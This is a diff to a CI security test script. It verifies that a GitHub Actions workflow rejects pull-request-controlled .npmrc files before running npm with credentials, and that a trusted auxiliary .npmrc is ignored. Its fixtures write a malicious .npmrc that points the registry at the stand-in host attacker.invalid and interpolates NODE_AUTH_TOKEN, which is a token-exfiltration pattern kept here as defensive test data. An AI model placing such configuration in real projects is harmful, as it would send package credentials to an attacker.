@@ -36,10 +36,24 @@ boundary = next(step for step in acquire_steps if step.get("name") == "Enforce t
 assert boundary["env"]["HEAD_REPOSITORY"] == "${{ github.event.pull_request.head.repo.full_name }}"
 assert boundary["env"]["REPOSITORY"] == "${{ github.repository }}"
 assert "same-repository pull request" in boundary["run"]
+primary_checkout_indexes = [i for i, step in enumerate(acquire_steps)
+                            if str(step.get("uses", "")).startswith("actions/checkout@")
+                            and "repository" not in step.get("with", {})]
+assert len(primary_checkout_indexes) == 1
+primary_checkout_index = primary_checkout_indexes[0]
+consumer_config_indexes = [i for i, step in enumerate(acquire_steps)
+                           if step.get("name") == "Reject consumer-controlled npm configuration"]
+assert len(consumer_config_indexes) == 1
+consumer_config_index = consumer_config_indexes[0]
+auxiliary_checkout_index = next(i for i, step in enumerate(acquire_steps) if step.get("name") == "Acquire immutable auxiliary source")
+install_index = next(i for i, step in enumerate(acquire_steps) if step.get("name") == "Acquire dependencies without lifecycle execution")
+consumer_config = acquire_steps[consumer_config_index]
+assert primary_checkout_index < consumer_config_index < auxiliary_checkout_index < install_index
+assert "find . -name .npmrc" in consumer_config["run"]
 install = next(step for step in acquire_steps if step.get("name") == "Acquire dependencies without lifecycle execution")
 assert install["env"]["NODE_AUTH_TOKEN"] == "${{ secrets.NODE_AUTH_TOKEN }}"
 assert install["env"]["NPM_CONFIG_USERCONFIG"].startswith("${{ runner.temp }}/")
-assert "find . -name .npmrc" in install["run"]
+assert "find . -name .npmrc" not in install["run"]
 assert "npm ci --ignore-scripts --no-audit --no-fund" in install["run"]
 checkout = next(step for step in acquire_steps if str(step.get("uses", "")).startswith("actions/checkout@"))
 assert checkout["with"]["persist-credentials"] is False
@@ -58,7 +72,8 @@ PY
 
 acquire_script="$(mktemp)"
 boundary_script="$(mktemp)"
-python3 - "$workflow" "$boundary_script" > "$acquire_script" <<'PY'
+consumer_config_script="$(mktemp)"
+python3 - "$workflow" "$boundary_script" "$consumer_config_script" > "$acquire_script" <<'PY'
 import sys
 import yaml
 
@@ -66,6 +81,8 @@ doc = yaml.safe_load(open(sys.argv[1], encoding="utf-8"))
 for step in doc["jobs"]["acquire-secretless-dependencies"]["steps"]:
     if step.get("name") == "Enforce the secretless PR boundary":
         open(sys.argv[2], "w", encoding="utf-8").write(step["run"])
+    if step.get("name") == "Reject consumer-controlled npm configuration":
+        open(sys.argv[3], "w", encoding="utf-8").write(step["run"])
     if step.get("name") == "Acquire dependencies without lifecycle execution":
         print(step["run"])
 PY
@@ -80,12 +97,14 @@ else
 fi
 
 acquire_fixture="$(mktemp -d)"
-mkdir -p "$acquire_fixture/bin" "$acquire_fixture/clean" "$acquire_fixture/malicious"
+mkdir -p "$acquire_fixture/bin" "$acquire_fixture/clean" "$acquire_fixture/malicious" "$acquire_fixture/trusted-auxiliary"
 printf '%s\n' \
   'registry=https://attacker.invalid/' \
   '//attacker.invalid/:_authToken=${NODE_AUTH_TOKEN}' \
   > "$acquire_fixture/malicious/.npmrc"
-printf '%s\n' '#!/usr/bin/env bash' 'printf '\''%s\n'\'' "$*" > "$NPM_STUB_LOG"' \
+printf '%s\n' '#!/usr/bin/env bash' \
+  'printf '\''%s\n'\'' "$*" > "$NPM_STUB_LOG"' \
+  '[ -z "${NPM_STUB_CONFIG_LOG:-}" ] || "$REAL_NPM" config get registry > "$NPM_STUB_CONFIG_LOG"' \
   > "$acquire_fixture/bin/npm"
 chmod +x "$acquire_fixture/bin/npm"
 
@@ -111,16 +130,33 @@ else
   fail "acquisition npm configuration is not fixed and host-scoped"
 fi
 
-if (cd "$acquire_fixture/malicious" && PATH="$acquire_fixture/bin:$PATH" \
-    NODE_AUTH_TOKEN='package-secret' NPM_STUB_LOG="$acquire_fixture/malicious.log" \
-    APPROVED_INTERNAL_SCOPES=$'@tequityapp\n@verjson' \
-    NPM_CONFIG_CACHE="$trusted_cache" \
-    NPM_CONFIG_USERCONFIG="$trusted_user_config" \
-    NPM_CONFIG_GLOBALCONFIG="$trusted_global_config" bash "$acquire_script") >/dev/null 2>&1 \
+if (cd "$acquire_fixture/malicious" && bash "$consumer_config_script") >/dev/null 2>&1 \
     || [ -e "$acquire_fixture/malicious.log" ]; then
   fail "a PR-controlled external-registry npmrc reached authenticated npm"
 else
   pass "a PR-controlled external-registry/token-interpolation npmrc fails before npm"
+fi
+
+real_npm="$(command -v npm)"
+if (cd "$acquire_fixture/trusted-auxiliary" && bash "$consumer_config_script" \
+    && mkdir -p "$acquire_fixture/trusted-auxiliary/.worker-schema" \
+    && printf '%s\n' 'registry=https://attacker.invalid/' \
+      '//attacker.invalid/:_authToken=${NODE_AUTH_TOKEN}' \
+      > "$acquire_fixture/trusted-auxiliary/.worker-schema/.npmrc" \
+    && cd "$acquire_fixture/trusted-auxiliary" \
+    && PATH="$acquire_fixture/bin:$PATH" REAL_NPM="$real_npm" \
+      NODE_AUTH_TOKEN='package-secret' NPM_STUB_LOG="$acquire_fixture/trusted-auxiliary.log" \
+      NPM_STUB_CONFIG_LOG="$acquire_fixture/trusted-auxiliary-config.log" \
+      APPROVED_INTERNAL_SCOPES=$'@tequityapp\n@verjson' \
+      NPM_CONFIG_CACHE="$trusted_cache" \
+      NPM_CONFIG_USERCONFIG="$trusted_user_config" \
+      NPM_CONFIG_GLOBALCONFIG="$trusted_global_config" bash "$acquire_script") \
+    && grep -qFx 'ci --ignore-scripts --no-audit --no-fund' "$acquire_fixture/trusted-auxiliary.log" \
+    && grep -qFx 'https://registry.npmjs.org/' "$acquire_fixture/trusted-auxiliary-config.log" \
+    && ! grep -qF 'attacker.invalid' "$acquire_fixture/trusted-auxiliary-config.log"; then
+  pass "trusted auxiliary root npmrc is materialized after the consumer guard and ignored by npm"
+else
+  fail "trusted auxiliary root npmrc affected consumer validation or npm acquisition"
 fi
 
 validator="$(mktemp)"
@@ -139,7 +175,7 @@ run_validator() {
 }
 
 fixture="$(mktemp -d)"
-trap 'rm -f "$validator" "$acquire_script" "$boundary_script"; rm -rf "$fixture" "$acquire_fixture"' EXIT
+trap 'rm -f "$validator" "$acquire_script" "$boundary_script" "$consumer_config_script"; rm -rf "$fixture" "$acquire_fixture"' EXIT
 mkdir -p "$fixture/valid" "$fixture/second-scope" "$fixture/scoped-root" "$fixture/hidden-name" "$fixture/dot-root" "$fixture/unapproved" "$fixture/external" "$fixture/unused" "$fixture/alias" "$fixture/direct" "$fixture/dot-segment" "$fixture/backslash"
 
 make_lock() {
